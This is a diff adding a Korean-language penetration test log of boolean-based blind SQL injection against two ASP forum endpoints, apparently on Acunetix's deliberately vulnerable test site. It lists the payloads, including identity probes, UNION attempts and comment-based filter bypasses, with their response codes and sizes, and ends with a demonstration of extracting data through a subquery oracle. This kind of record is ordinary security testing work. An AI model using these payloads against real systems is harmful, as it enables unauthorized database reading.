@@ -1,0 +1,36 @@
+### D1. /showforum.asp?id=  (GET, 읽기 전용)
+  baseline id=0                                                  200 5811   threadlinks=10
+  id=1 (다른 포럼)                                           200 4143   threadlinks=1
+  id=0 AND 1=1  (TRUE)                                           200 5827   threadlinks=10
+  id=0 AND 1=2  (FALSE)                                          500 1208   threadlinks=0
+  id=0 AND (SELECT SYSTEM_USER)='acunetix'  (TRUE)               200 5875   threadlinks=10
+  id=0 AND (SELECT SYSTEM_USER)='sa'        (FALSE)              500 1208   threadlinks=0
+  id=0 AND (SELECT DB_NAME())='acuforum'    (TRUE)               200 5881   threadlinks=10
+  id=0 AND (SELECT DB_NAME())='master'      (FALSE)              500 1208   threadlinks=0
+  오류기반  id=0'                                            500 1208   threadlinks=0
+  오류기반  id=0"                                            500 1208   threadlinks=0
+  UNION 2컬럼  id=0 UNION SELECT 'INJ',descr FROM forums WHERE id=1 500 1208   threadlinks=0
+  주석형  id=0--                                              200 5817   threadlinks=10
+  공백대체  id=0/**/AND/**/1=1                               200 5861   threadlinks=10
+
+### D2. /showthread.asp?id=  (GET, 읽기 전용, 대상 = 우리 스레드 9)
+  baseline id=9 (우리 스레드, 게시글 2건)               200 4531   posts=2
+  id=9 AND 1=1  (TRUE)                                           200 4547   posts=2
+  id=9 AND 1=2  (FALSE)                                          500 1208   posts=0
+  id=9 AND (SELECT COUNT(*) FROM posts WHERE threadid=9)=2 (TRUE) 200 4625   posts=2
+  id=9 AND (SELECT COUNT(*) FROM posts WHERE threadid=9)=99 (FALSE) 500 1208   posts=0
+  id=9 AND (SELECT SYSTEM_USER)='acunetix' (TRUE)                200 4595   posts=2
+  id=9 AND (SELECT SYSTEM_USER)='sa' (FALSE)                     500 1208   posts=0
+  오류기반  id=9'                                            500 1208   posts=0
+  id=9 OR 1=1 (전 스레드 노출 시도)                      500 1208   posts=0
+  UNION 4컬럼  id=9 UNION SELECT 'INJ',0,9,'INJ'               500 1208   posts=0
+  공백대체  id=9/**/AND/**/1=1                               200 4581   posts=2
+  공백대체  id=9/**/AND/**/1=2                               500 1208   posts=0
+
+### D3. 추출 시연 — 우리 스레드 조건에서 서브쿼리 오라클로 카운트 추출
+  (SELECT COUNT(*) FROM posts WHERE threadid=9) > 0   → TRUE(게시글 렌더)
+  (SELECT COUNT(*) FROM posts WHERE threadid=9) > 1   → TRUE(게시글 렌더)
+  (SELECT COUNT(*) FROM posts WHERE threadid=9) > 2   → FALSE
+  (SELECT COUNT(*) FROM posts WHERE threadid=9) > 3   → FALSE
+  (SELECT COUNT(*) FROM posts WHERE threadid=9) > 5   → FALSE
+  (SELECT COUNT(*) FROM posts WHERE threadid=9) > 10  → FALSE
